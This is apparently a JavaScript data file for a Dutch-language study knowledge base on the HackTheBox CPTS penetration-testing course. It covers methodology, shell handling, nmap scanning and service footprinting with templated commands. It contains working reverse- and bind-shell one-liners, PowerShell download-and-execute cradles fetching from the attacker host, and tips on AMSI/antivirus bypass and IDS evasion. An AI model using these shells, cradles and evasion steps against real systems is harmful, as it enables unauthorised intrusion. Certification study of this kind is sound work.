/* ══════════════════════════════════════════════════════════════
   CPTS KENNISBANK — DATA
   Placeholders worden live vervangen door de balk-waardes:
   {{IP}} {{DOMAIN}} {{URL}} {{LHOST}} {{LPORT}} {{USER}} {{PASS}} {{WORDLIST}}
   Schema module: { id, cat, icon, name, desc, tier, diff, done, intro,
     groups:[ { title, intro?, items:[ { h, d?, code?, tags?, note? } ] } ] }
   ══════════════════════════════════════════════════════════════ */

const KB_VARS = [
  { key: 'IP',       label: 'RHOST',    def: '10.10.10.10',                          wide: false },
  { key: 'DOMAIN',   label: 'DOMAIN',   def: 'target.htb',                           wide: false },
  { key: 'URL',      label: 'URL',      def: 'http://target.htb',                    wide: true  },
  { key: 'LHOST',    label: 'LHOST',    def: '10.10.14.10',                          wide: false },
  { key: 'LPORT',    label: 'LPORT',    def: '443',                                  wide: false },
  { key: 'USER',     label: 'USER',     def: 'admin',                                wide: false },
  { key: 'PASS',     label: 'PASS',     def: 'password',                             wide: false },
  { key: 'WORDLIST', label: 'WORDLIST', def: '/usr/share/wordlists/rockyou.txt',     wide: true  }
];

const KB_ICONS = {
  process:   'M9 11l3 3L22 4 M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11',
  start:     'M13 2L3 14h9l-1 8 10-12h-9l1-8z',
  nmap:      'M2 12h4l3 8 4-16 3 8h6',
  foot:      'M12 2a7 7 0 0 0-7 7c0 5 7 13 7 13s7-8 7-13a7 7 0 0 0-7-7z M12 9m-2 0a2 2 0 1 0 4 0 2 2 0 1 0-4 0',
  web:       'M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20 M2 12h20 M12 2a15 15 0 0 1 0 20 M12 2a15 15 0 0 0 0 20',
  vuln:      'M12 2l9 4v6c0 5-3.8 9.4-9 10-5.2-.6-9-5-9-10V6l9-4z M12 8v4 M12 16h.01',
  transfer:  'M4 17l6-6-6-6 M12 19h8 M14 5h6',
  shells:    'M4 4h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z M6 9l3 3-3 3 M12 15h5',
  msf:       'M12 2l3 7h7l-5.5 4 2 7-6.5-4.5L5.5 20l2-7L2 9h7z',
  pass:      'M7 11V7a5 5 0 0 1 10 0v4 M5 11h14a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2z',
  services:  'M4 4h16v6H4z M4 14h16v6H4z M8 7h.01 M8 17h.01',
  proxies:   'M8 3H5a2 2 0 0 0-2 2v3 M16 3h3a2 2 0 0 1 2 2v3 M21 16v3a2 2 0 0 1-2 2h-3 M3 16v3a2 2 0 0 0 2 2h3 M9 12h6',
  ffuf:      'M3 5h18 M3 12h12 M3 19h18 M17 12l4 3-4 3',
  brute:     'M7 11V8a5 5 0 0 1 9.9-1 M5 11h14a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2z M12 15v3',
  sqli:      'M12 3c4.4 0 8 1.3 8 3s-3.6 3-8 3-8-1.3-8-3 3.6-3 8-3z M4 6v6c0 1.7 3.6 3 8 3s8-1.3 8-3V6 M4 12v6c0 1.7 3.6 3 8 3s8-1.3 8-3v-6',
  sqlmap:    'M12 3c4.4 0 8 1.3 8 3s-3.6 3-8 3-8-1.3-8-3 3.6-3 8-3z M4 6v12c0 1.7 3.6 3 8 3 M20 6v5 M15 19l2 2 4-4',
  xss:       'M8 6l-6 6 6 6 M16 6l6 6-6 6 M13 4l-2 16',
  lfi:       'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z M14 2v6h6 M9 13l-2 2 2 2 M13 13l2 2-2 2',
  upload:    'M12 15V3 M7 8l5-5 5 5 M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2',
  cmdi:      'M4 5h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z M7 9l3 3-3 3 M13 15h4',
  webattacks:'M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20 M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8 M12 11v.01',
  apps:      'M4 4h6v6H4z M14 4h6v6h-6z M4 14h6v6H4z M14 14h6v6h-6z',
  pivot:     'M5 5m-2 0a2 2 0 1 0 4 0 2 2 0 1 0-4 0 M19 5m-2 0a2 2 0 1 0 4 0 2 2 0 1 0-4 0 M12 19m-2 0a2 2 0 1 0 4 0 2 2 0 1 0-4 0 M6.5 6.8l4 10.4 M17.5 6.8l-4 10.4 M7 5h10',
  ad:        'M3 3h8v8H3z M13 3h8v8h-8z M3 13h8v8H3z M13 13h8v8h-8z',
  linpe:     'M3 20h4v-4h4v-4h4v-4h4v-4 M3 20v-2',
  winpe:     'M12 2l9 4v6c0 5-3.8 9.4-9 10-5.2-.6-9-5-9-10V6l9-4z M9 12l2 2 4-4',
  report:    'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z M14 2v6h6 M8 13h8 M8 17h8 M8 9h2'
};

const KB_MODULES = [
/* ══════════════════════════════════════════════════════════════
   PENETRATION TESTING PROCESS
══════════════════════════════════════════════════════════════ */
{
  id: 'process', cat: 'Fundamenten', icon: 'process', name: 'Penetration Testing Process',
  desc: 'De methodiek — de fases van een engagement en waar elke tactiek in past.',
  tier: 'Tier I', diff: 'Fundamental', done: true,
  intro: 'Penetration testing is een <b>gestructureerd, herhaalbaar proces</b>, geen willekeurige verzameling exploits. Elke box en elk echt assessment volgt dezelfde lus: verzamel informatie, analyseer, val aan, en herhaal vanaf de nieuwe positie. Deze module is je mentale kaart — als je vastzit, ben je bijna altijd een <b>enumeratiestap</b> vergeten. "Enumeration is key" is geen cliché maar de kern van het vak.',
  groups: [
    { title: 'De fases van een pentest', intro: 'HTB deelt een engagement op in fases. In de praktijk lopen ze in elkaar over en herhaal je ze zodra je nieuwe toegang of credentials krijgt.', items: [
      { h: 'De 7 fases', tags: ['methodology'],
        d: 'Doorloop ze als checklist. Enumeratie (2) en exploitatie (4/5) zijn <b>iteratief</b>: nieuwe toegang = terug naar enumeratie vanuit die context.',
        note: { type: 'info', text: '<b>1.</b> Pre-Engagement (scope, rules of engagement, contract) · <b>2.</b> Information Gathering · <b>3.</b> Vulnerability Assessment · <b>4.</b> Exploitation · <b>5.</b> Post-Exploitation · <b>6.</b> Lateral Movement · <b>7.</b> Proof-of-Concept &amp; Post-Engagement (rapportage)' } },
      { h: 'Pre-Engagement', tags: ['scoping'],
        d: 'Voordat er één pakket verstuurd wordt: <b>scope</b> (welke IP-ranges/domeinen), <b>rules of engagement</b> (mag social engineering? DoS? tijdvenster?), contract, NDA en een noodcontact. Alles buiten scope is illegaal — ook al is het triviaal.' },
      { h: 'Information Gathering', tags: ['recon'],
        d: 'Passief (geen contact: OSINT, DNS, certificaten) en actief (poortscans, service-enumeratie, web-content). Doel: het complete <b>aanvalsoppervlak</b> — hosts, poorten, services + versies, technologieën, gebruikersnamen, e-mailformaat.' },
      { h: 'Vulnerability Assessment', tags: ['analysis'],
        d: 'Koppel gevonden services aan bekende kwetsbaarheden (CVE), misconfiguraties, standaard-credentials en logische fouten. Prioriteer op <b>exploiteerbaarheid × impact</b>, niet blind op CVSS-score.' },
      { h: 'Exploitation & Post-Exploitation', tags: ['exploit', 'privesc'],
        d: 'Zet een zwakte om in toegang, kies de meest betrouwbare en minst destructieve weg. Daarna: loot verzamelen (creds, keys, config), lokale enumeratie en <b>privilege escalation</b> naar root/SYSTEM.' },
      { h: 'Lateral Movement', tags: ['pivot'],
        d: 'Van de eerste host naar de rest van het netwerk: gestolen credentials hergebruiken, pivoten naar interne subnets, richting het einddoel (meestal Domain Admin of specifieke crown jewels).' },
    ]},
    { title: 'Werkwijze & documentatie', intro: 'Rommelige notities kosten je punten in het examen en tijd in de praktijk. Bouw vanaf minuut één aan je rapport.', items: [
      { h: 'Map-structuur per host', tags: ['workflow', 'must-know'],
        d: 'Één map per host, vaste submappen. Zo vind je alles terug en genereer je later makkelijk je rapport.',
        code: `mkdir -p {{DOMAIN}}/{scans,loot,exploits,web,notes}\ncd {{DOMAIN}}\n# scans/    -> nmap, nikto, ffuf output\n# loot/     -> gevonden creds, hashes, keys\n# exploits/ -> aangepaste PoC scripts\n# web/      -> gedownloade bronbestanden` },
      { h: 'Alles loggen tijdens een sessie', tags: ['workflow'],
        d: 'Log je hele terminalsessie inclusief timestamps — bewijs voor je rapport en onmisbaar als iets stukgaat.',
        code: `script -a engagement.log        # start logging (exit om te stoppen)\n# tmux met timestamps als alternatief\ntmux new -s cpts` },
      { h: 'Notities: wat schrijf je op?', tags: ['workflow'],
        d: 'Per bevinding: <b>waar</b> (host/poort/URL), <b>wat</b> (kwetsbaarheid), <b>bewijs</b> (screenshot + exact commando), <b>impact</b>. Screenshot elke succesvolle stap meteen — je herhaalt hem later niet graag.',
        note: { type: 'info', text: 'Handige tools: <b>CherryTree</b>, <b>Obsidian</b>, <b>Sublime</b> of gewoon markdown per host. In het CPTS-examen moet je alles kunnen reproduceren in je rapport.' } },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   GETTING STARTED
══════════════════════════════════════════════════════════════ */
{
  id: 'start', cat: 'Fundamenten', icon: 'start', name: 'Getting Started',
  desc: 'Basisreflexen: verbinden, een eerste shell krijgen, upgraden en oriënteren.',
  tier: 'Tier 0', diff: 'Fundamental', done: true,
  intro: 'De fundamenten die je op <b>elke</b> box gebruikt: verbinding maken met het lab, snel checken wat er leeft, een reverse of bind shell krijgen, en die shell direct upgraden naar een volwaardige TTY. Zonder een stabiele shell werkt <code>sudo</code>, tab-completion en <code>Ctrl-C</code> vaak niet — dit is dus geen bijzaak.',
  groups: [
    { title: 'Shells: het verschil', intro: 'Bij een <b>reverse shell</b> verbindt het target náár jou (handig, want firewalls staan uitgaand verkeer meestal toe). Bij een <b>bind shell</b> opent het target een poort waar jij naartoe verbindt. Reverse is de standaardkeuze.', items: [
      { h: 'Reverse vs. bind vs. web shell', tags: ['concept'],
        d: '<b>Reverse:</b> target → attacker (jij draait de listener). <b>Bind:</b> target luistert → jij verbindt. <b>Web shell:</b> een bestand op de webserver dat commando\'s uitvoert via HTTP-parameters. Kies reverse tenzij uitgaand verkeer geblokkeerd is.' },
    ]},
    { title: 'Verbinden & oriënteren', items: [
      { h: 'VPN verbinden (HTB)', tags: ['setup'],
        d: 'Na verbinden krijg je een <code>tun0</code>-interface. Dat IP is je <b>{{LHOST}}</b> voor alle reverse shells.',
        code: `sudo openvpn user.ovpn\n# in een tweede terminal je tun0-IP checken:\nip -brief addr show tun0` },
      { h: 'Leeft de host? OS raden', tags: ['recon'],
        d: 'De TTL in het ping-antwoord verraadt vaak het OS: ~64 = Linux/Unix, ~128 = Windows, ~255 = netwerkapparaat.',
        code: `ping -c 2 {{IP}}` },
      { h: 'Snelle poort-check zonder nmap', tags: ['recon'],
        d: 'Handig als je alleen een shell hebt en nmap niet beschikbaar is.',
        code: `nc -nvz {{IP}} 22 80 443 445 3389\n# puur bash, geen tools nodig:\nfor p in 21 22 80 139 445 3389; do (echo >/dev/tcp/{{IP}}/$p) 2>/dev/null && echo "$p open"; done` },
    ]},
    { title: 'Reverse & bind shells', intro: 'Start <b>altijd</b> eerst je listener, vuur dan pas de payload af. Zo mis je de terugverbinding niet.', items: [
      { h: 'Listener starten (attacker)', tags: ['shell', 'must-know'],
        code: `nc -lvnp {{LPORT}}` },
      { h: 'Bash reverse shell', tags: ['shell', 'linux', 'must-know'],
        d: 'De klassieker. Werkt op de meeste Linux-targets met bash.',
        code: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1` },
      { h: 'Reverse shell — alternatieven', tags: ['shell'],
        d: 'Als bash gefilterd is of ontbreekt. Kies wat er op het target aanwezig is.',
        code: `# Python3\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'\n# nc met -e\nnc {{LHOST}} {{LPORT}} -e /bin/bash\n# PHP\nphp -r '$s=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/bash -i <&3 >&3 2>&3");'\n# Perl\nperl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'` },
      { h: 'Windows PowerShell reverse shell', tags: ['shell', 'windows', 'must-know'],
        d: 'Een <b>inline</b> reverse-shell-oneliner wordt door Defender/AMSI direct afgevangen (en triggert ook lokale AV). De werkbare aanpak: host een reverse-shell-script op je HTTP-server en haal het met een download-cradle op, of gebruik een kant-en-klare tool. Start eerst je listener (<code>nc -lvnp {{LPORT}}</code>).',
        code: `# Nishang Invoke-PowerShellTcp (host shell.ps1, dan cradle):\npowershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/shell.ps1')"\n# powercat:\npowershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/powercat.ps1');powercat -c {{LHOST}} -p {{LPORT}} -e powershell"\n# of een msfvenom-exe / ConPtyShell — zie de module Shells & Payloads` },
      { h: 'AMSI/AV-bypass — waar te zoeken', tags: ['shell', 'windows', 'evasion'],
        d: 'Wordt je payload gepakt? Denk aan: script hosten i.p.v. inline, een AMSI-bypass vóór je <code>IEX</code>, obfuscatie (Invoke-Obfuscation), een gecompileerde exe via msfvenom met encoding, of <b>ConPtyShell</b> voor een volwaardige PTY. Op je éigen machine: voeg een Defender-uitzondering toe voor je tools-map.',
        note: { type: 'warn', text: 'Werkende reverse-shell-oneliners zijn per definitie malware-signatures — je eigen AV quarantinet ze (en je Claude Code-logs). Bewaar rauwe payloads liefst buiten deze repo, of zet een Defender-uitzondering op je werkmap.' } },
      { h: 'Bind shell', tags: ['shell'],
        d: 'Target luistert, jij verbindt. Alleen zinvol als inkomend verkeer naar het target is toegestaan.',
        code: `# op target:\nnc -lvnp {{LPORT}} -e /bin/bash\n# op attacker:\nnc {{IP}} {{LPORT}}` },
    ]},
    { title: 'Shell stabiliseren (TTY-upgrade)', intro: 'Een kale <code>nc</code>-shell is fragiel: geen job control, <code>Ctrl-C</code> killt je sessie, geen sudo-prompt. Upgrade hem altijd meteen.', items: [
      { h: 'Volledige interactieve TTY', tags: ['shell', 'must-know'],
        d: 'De belangrijkste truc in dit hele traject. Na deze stappen werkt tab-completion, <code>Ctrl-C</code>, arrow-keys en <code>sudo</code>.',
        code: `python3 -c 'import pty;pty.spawn("/bin/bash")'\n# druk daarna: Ctrl-Z (shell naar achtergrond)\nstty raw -echo; fg\n# druk 2x Enter, daarna:\nexport TERM=xterm\nexport SHELL=/bin/bash` },
      { h: 'Terminalgrootte fixen', tags: ['shell'],
        d: 'Draai <code>stty size</code> in je éigen terminal (buiten de shell) en vul de waarden hieronder in — anders knippen editors als nano/vim af.',
        code: `stty rows 38 columns 116` },
      { h: 'Alternatief via socat (volledige PTY)', tags: ['shell'],
        d: 'Levert direct een perfecte TTY zonder de stty-dans. Vereist socat op beide kanten.',
        code: `# attacker (listener):\nsocat file:\`tty\`,raw,echo=0 tcp-listen:{{LPORT}}\n# target:\nsocat tcp-connect:{{LHOST}}:{{LPORT}} exec:/bin/bash,pty,stderr,setsid,sigint,sane` },
      { h: 'Geen Python? PTY via script', tags: ['shell'],
        d: 'Als <code>python</code> ontbreekt, spawnt <code>script</code> alsnog een pty. Doe daarna dezelfde stty-stappen (Ctrl-Z → <code>stty raw -echo; fg</code>).',
        code: `/usr/bin/script -qc /bin/bash /dev/null` },
      { h: 'History & pijltjes in nc (rlwrap)', tags: ['shell', 'workflow'],
        d: 'Start je listener via <code>rlwrap</code> voor arrow-keys, command-history en regelbewerking — óók vóór de TTY-upgrade.',
        code: `rlwrap nc -lvnp {{LPORT}}` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   NETWORK ENUMERATION WITH NMAP
══════════════════════════════════════════════════════════════ */
{
  id: 'nmap', cat: 'Enumeratie & Recon', icon: 'nmap', name: 'Network Enumeration met Nmap',
  desc: 'Van eerste sweep tot diepe service-scan, plus timing en IDS/firewall-evasion.',
  tier: 'Tier I', diff: 'Easy', done: true,
  intro: 'Nmap is je hoofdgereedschap voor het in kaart brengen van hosts, poorten en services. De <b>tweetraps-aanpak</b> is de standaard: eerst snel álle 65535 TCP-poorten scannen, dan alleen op de open poorten een diepe <code>-sC -sV</code> scan draaien. Zo verspil je geen tijd met scripts op dichte poorten. Vergeet <b>UDP</b> niet — daar leven SNMP, DNS en TFTP die vaak de sleutel zijn.',
  groups: [
    { title: 'Host discovery', intro: 'Eerst bepalen welke hosts leven. In een lab met één target sla je dit meestal over met <code>-Pn</code>.', items: [
      { h: 'Ping sweep (levende hosts)', tags: ['discovery'],
        d: 'Alleen host-discovery (<code>-sn</code> = geen poortscan). Snel een subnet in kaart brengen.',
        code: `sudo nmap -sn 10.10.10.0/24 -oA scans/hosts | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+'` },
      { h: 'Host blokkeert ping (-Pn)', tags: ['discovery', 'must-know'],
        d: 'Windows-hosts negeren vaak ICMP. Zonder <code>-Pn</code> denkt nmap dat de host down is en scant niets.',
        code: `sudo nmap -Pn {{IP}}` },
    ]},
    { title: 'Poortscans', intro: 'Standaard doet nmap een SYN-scan (<code>-sS</code>, snel, "half-open") als je root bent, anders een TCP-connect scan (<code>-sT</code>).', items: [
      { h: 'Stap 1 — alle poorten snel', tags: ['scan', 'must-know'],
        d: '<code>-p-</code> = alle 65535 poorten. <code>--min-rate 5000</code> forceert tempo. Output naar alle formaten met <code>-oA</code>.',
        code: `sudo nmap -p- --min-rate 5000 -T4 {{IP}} -oA scans/allports` },
      { h: 'Stap 2 — diep op open poorten', tags: ['scan', 'must-know'],
        d: '<code>-sC</code> = default NSE-scripts, <code>-sV</code> = versiedetectie, <code>-O</code> = OS-detectie. Draai dit op de open poorten uit stap 1.',
        code: `sudo nmap -sC -sV -p 22,80,445 {{IP}} -oA scans/services` },
      { h: 'Open poorten als komma-lijst extraheren', tags: ['scan', 'workflow'],
        d: 'Zet de open poorten uit stap 1 direct om naar de <code>-p</code>-lijst voor stap 2.',
        code: `ports=$(grep -oP '\\d+/open' scans/allports.gnmap | cut -d/ -f1 | paste -sd,)\nsudo nmap -sC -sV -p $ports {{IP}} -oA scans/services` },
      { h: 'UDP top-poorten', tags: ['scan', 'udp', 'must-know'],
        d: 'UDP is traag maar onthult SNMP (161), DNS (53), TFTP (69), IKE (500), SNMP-trap. Niet overslaan.',
        code: `sudo nmap -sU --top-ports 100 {{IP}} -oA scans/udp` },
    ]},
    { title: 'NSE scripts', intro: 'De Nmap Scripting Engine (<code>/usr/share/nmap/scripts</code>) automatiseert enumeratie en vuln-checks. Categorieën: <code>default, safe, discovery, vuln, auth, brute, intrusive</code>.', items: [
      { h: 'Vuln-scripts draaien', tags: ['nse', 'vuln'],
        code: `sudo nmap -sV --script vuln {{IP}} -oA scans/vuln` },
      { h: 'Scripts per service/categorie', tags: ['nse'],
        d: 'Gerichte scripts geven vaak meteen shares, versies of bekende exploits.',
        code: `nmap --script 'smb-enum*' -p445 {{IP}}\nnmap --script 'http-enum,http-title,http-headers' -p80 {{IP}}\nnmap --script 'ftp-anon,ftp-syst' -p21 {{IP}}\n# beschikbare scripts vinden:\nls /usr/share/nmap/scripts | grep smb` },
    ]},
    { title: 'Output & rapportage', items: [
      { h: 'Alle output-formaten (-oA)', tags: ['output'],
        d: '<code>-oA</code> schrijft <code>.nmap</code> (leesbaar), <code>.gnmap</code> (grepbaar) en <code>.xml</code> tegelijk. Doe dit altijd.',
        code: `sudo nmap -sC -sV {{IP}} -oA scans/tcp` },
      { h: 'XML omzetten naar HTML-rapport', tags: ['output'],
        code: `xsltproc scans/tcp.xml -o scans/tcp.html` },
    ]},
    { title: 'Timing & IDS/firewall-evasion', intro: 'In het CPTS-examen mag je soms een IDS ontwijken. Trager scannen, fragmenteren en je bronpoort spoofen verlaagt de kans op detectie.', items: [
      { h: 'Timing-templates (-T0 t/m -T5)', tags: ['timing'],
        d: '<code>-T0/-T1</code> = sluipend (uren), <code>-T3</code> = normaal, <code>-T4</code> = snel (lab-standaard), <code>-T5</code> = agressief (kan pakketten missen).',
        code: `sudo nmap -T2 {{IP}}       # stil\nsudo nmap -T4 {{IP}}       # lab-standaard` },
      { h: 'Firewall/IDS ontwijken', tags: ['evasion'],
        d: '<code>-f</code> fragmenteert pakketten, <code>--source-port 53</code> doet zich voor als DNS-verkeer, <code>-D</code> voegt lokvogel-IP\'s toe, <code>--data-length</code> maskeert de pakketgrootte.',
        code: `sudo nmap -sS -f --source-port 53 --data-length 24 {{IP}}\n# decoys (RND:10 = 10 willekeurige lokvogels):\nsudo nmap -D RND:10 {{IP}}\n# spoof MAC:\nsudo nmap --spoof-mac 0 {{IP}}` },
      { h: 'Waarom een poort "filtered" is', tags: ['concept'],
        d: '<b>open</b> = service antwoordt. <b>closed</b> = host antwoordt met RST (geen service). <b>filtered</b> = een firewall dropt je pakket, geen antwoord — probeer <code>-Pn</code>, andere scan-types of UDP.' },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   FOOTPRINTING (per service)
══════════════════════════════════════════════════════════════ */
{
  id: 'foot', cat: 'Enumeratie & Recon', icon: 'foot', name: 'Footprinting — Service Enumeration',
  desc: 'Per protocol wat je checkt. De grootste module — zoek op poort of servicenaam.',
  tier: 'Tier II', diff: 'Medium', done: true,
  intro: 'Footprinting is <b>diepe service-enumeratie</b>: voor elke open poort weet je wélke informatie je eruit kunt trekken zonder al te exploiten. Denk aan versiebanners, shares, gebruikers, DNS-records en standaard-credentials. Dit is waar de meeste boxes gewonnen of verloren worden — een gemiste anonieme login of null-session kost je uren. Werk elke service systematisch af.',
  groups: [
    { title: 'FTP · 21', intro: 'FTP is klaartekst. Check altijd op anonieme login en bruikbare bestanden.', items: [
      { h: 'Anonieme login & banner', tags: ['ftp', '21', 'must-know'],
        d: 'Login <code>anonymous</code> met leeg wachtwoord. Zet <code>binary</code> aan voor niet-tekstbestanden.',
        code: `ftp {{IP}}\n# user: anonymous  pass: (leeg)\n# binnenin: ls, cd, get <bestand>, mget *, binary, passive` },
      { h: 'Recursief alles downloaden', tags: ['ftp', '21'],
        code: `wget -m --no-passive ftp://anonymous:anonymous@{{IP}}` },
      { h: 'nmap FTP-scripts', tags: ['ftp', '21'],
        code: `sudo nmap -sV -p21 --script ftp-anon,ftp-syst {{IP}}` },
    ]},
    { title: 'SMB · 139/445', intro: 'SMB (Windows file sharing) is een goudmijn: shares, gebruikers, groepen en beleid — vaak zonder credentials via een <b>null session</b>.', items: [
      { h: 'Shares listen (null session)', tags: ['smb', '445', 'must-know'],
        d: 'Probeer eerst zonder auth (<code>-N</code>), daarna met gevonden credentials. <code>smbmap</code> toont ook je rechten (READ/WRITE) per share.',
        code: `smbclient -N -L //{{IP}}\nsmbmap -H {{IP}}\nsmbmap -H {{IP}} -u {{USER}} -p {{PASS}}` },
      { h: 'Verbinden met een share', tags: ['smb', '445'],
        d: 'Binnen smbclient: <code>recurse ON</code> + <code>prompt OFF</code> + <code>mget *</code> haalt alles op.',
        code: `smbclient //{{IP}}/share -N\nsmbclient //{{IP}}/share -U {{USER}}%{{PASS}}` },
      { h: 'Volledige enum (enum4linux-ng)', tags: ['smb', '445', 'must-know'],
        d: 'Users, groepen, shares, OS, wachtwoordbeleid en RID-cycling in één commando.',
        code: `enum4linux-ng -A {{IP}}` },
      { h: 'Users & RID-cycling via rpcclient', tags: ['smb', '445'],
        d: 'Ook zonder credentials kun je vaak domeingebruikers oplijsten via de RPC-interface.',
        code: `rpcclient -U "" -N {{IP}}\n# > enumdomusers\n# > querydominfo\n# > lookupnames administrator` },
      { h: 'netexec (snelle overview + spidering)', tags: ['smb', '445', 'must-know'],
        d: 'Toont OS, hostname, domein, signing-status en shares. Basis voor password spraying later.',
        code: `netexec smb {{IP}}\nnetexec smb {{IP}} -u {{USER}} -p {{PASS}} --shares\nnetexec smb {{IP}} -u {{USER}} -p {{PASS}} -M spider_plus` },
      { h: 'Vuln-check (o.a. EternalBlue)', tags: ['smb', 'vuln'],
        code: `sudo nmap -p445 --script smb-vuln* {{IP}}` },
    ]},
    { title: 'NFS · 2049', intro: 'NFS deelt Unix-mappen. Rechten hangen aan UID/GID — als jij dezelfde UID hebt als de eigenaar, lees je alles.', items: [
      { h: 'Exports tonen & mounten', tags: ['nfs', '2049'],
        d: 'Ziet root_squash uit? Dan kun je met een lokale gebruiker met matchende UID bij bestanden, of no_root_squash misbruiken voor privesc.',
        code: `showmount -e {{IP}}\nsudo mkdir -p /mnt/nfs\nsudo mount -t nfs {{IP}}:/export /mnt/nfs -o nolock\nls -la /mnt/nfs` },
    ]},
    { title: 'DNS · 53', intro: 'DNS lekt vaak de hele interne structuur via een verkeerd geconfigureerde zone transfer.', items: [
      { h: 'Zone transfer (AXFR)', tags: ['dns', '53', 'must-know'],
        d: 'Een geslaagde AXFR dumpt alle records — subdomeinen, interne hosts, mailservers. De snelste win die er is.',
        code: `dig axfr {{DOMAIN}} @{{IP}}\nfierce --domain {{DOMAIN}} --dns-servers {{IP}}` },
      { h: 'Losse records opvragen', tags: ['dns', '53'],
        code: `dig any {{DOMAIN}} @{{IP}}\ndig +short mx {{DOMAIN}} @{{IP}}\ndig +short ns {{DOMAIN}} @{{IP}}` },
      { h: 'Subdomeinen brute-forcen', tags: ['dns', '53'],
        code: `dnsenum --dnsserver {{IP}} --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt {{DOMAIN}}` },
    ]},
    { title: 'SMTP · 25 / IMAP · 143 / POP3 · 110', intro: 'Mailservers lekken gebruikersnamen (via VRFY/RCPT) en bevatten soms leesbare mailboxen.', items: [
      { h: 'SMTP user enumeration', tags: ['smtp', '25'],
        d: 'Bestaande gebruikers reageren anders dan niet-bestaande. Levert een user-lijst voor password attacks.',
        code: `smtp-user-enum -M RCPT -U users.txt -D {{DOMAIN}} -t {{IP}}\n# handmatig:\nnc -nv {{IP}} 25\n# VRFY root  /  RCPT TO:<root>` },
      { h: 'IMAP/POP3 inloggen & lezen', tags: ['imap', '143'],
        d: 'Met gevonden mail-credentials kun je vaak direct de inbox lezen — daar staan regelmatig nieuwe wachtwoorden in.',
        code: `# POP3\nnc -nv {{IP}} 110\n# USER {{USER}} / PASS {{PASS}} / LIST / RETR 1\n# IMAP via curl\ncurl -k 'imaps://{{IP}}' --user '{{USER}}:{{PASS}}'` },
    ]},
    { title: 'SNMP · 161 (UDP)', intro: 'SNMP met een geraden community string ("public") lekt processen, netwerkconfig, gebruikers en soms wachtwoorden in klaartekst.', items: [
      { h: 'Community strings raden & walken', tags: ['snmp', '161', 'udp', 'must-know'],
        code: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{IP}}\nsnmpwalk -v2c -c public {{IP}}\nsnmpbulkwalk -v2c -c public {{IP}}` },
      { h: 'snmp-check (leesbare samenvatting)', tags: ['snmp', '161', 'udp'],
        code: `snmp-check {{IP}} -c public` },
    ]},
    { title: 'Databases: MySQL · 3306 / MSSQL · 1433 / Oracle · 1521', items: [
      { h: 'MySQL verbinden & enumereren', tags: ['mysql', '3306'],
        code: `mysql -h {{IP}} -u {{USER}} -p'{{PASS}}'\n# > show databases; use <db>; show tables; select * from users;\n# > select load_file('/etc/passwd');  -- file read indien rechten` },
      { h: 'MSSQL verbinden (impacket)', tags: ['mssql', '1433', 'must-know'],
        d: 'Met <code>xp_cmdshell</code> (indien enabled) kun je OS-commando\'s uitvoeren = RCE.',
        code: `impacket-mssqlclient {{USER}}:{{PASS}}@{{IP}} -windows-auth\n# > enable_xp_cmdshell\n# > xp_cmdshell whoami` },
      { h: 'Oracle TNS', tags: ['oracle', '1521'],
        d: 'Eerst SID achterhalen, dan standaard-credentials proberen (scott/tiger, system/manager).',
        code: `sudo nmap -p1521 --script oracle-sid-brute {{IP}}\nodat all -s {{IP}}` },
    ]},
    { title: 'LDAP · 389/636 / Kerberos · 88', intro: 'Op een Domain Controller lekken LDAP en Kerberos vaak de domeinstructuur en geldige gebruikersnamen — soms al zonder credentials. Dit is je opstap naar de AD-module.', items: [
      { h: 'Anonieme LDAP-bind & naming context', tags: ['ldap', '389', 'ad'],
        d: 'Vraag eerst de <code>rootDSE</code> op voor de naming context (bv. <code>DC=target,DC=htb</code>); dump daarmee users en groepen als anonieme bind is toegestaan.',
        code: `ldapsearch -x -H ldap://{{IP}} -s base namingcontexts\nldapsearch -x -H ldap://{{IP}} -b 'DC=target,DC=htb'\nnmap -p389 --script ldap-rootdse,ldap-search {{IP}}` },
      { h: 'LDAP met credentials (users/groepen)', tags: ['ldap', '389', 'ad'],
        code: `ldapsearch -x -H ldap://{{IP}} -D '{{USER}}@{{DOMAIN}}' -w '{{PASS}}' \\\n  -b 'DC=target,DC=htb' '(objectClass=user)' sAMAccountName` },
      { h: 'Kerberos user enumeration (kerbrute)', tags: ['kerberos', '88', 'ad', 'must-know'],
        d: 'Kerberos verraadt of een gebruikersnaam bestaat zonder een inlogpoging te doen — ruis-arm en zonder lockout. Levert een geverifieerde user-lijst voor spraying/roasting.',
        code: `kerbrute userenum -d {{DOMAIN}} --dc {{IP}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` },
    ]},
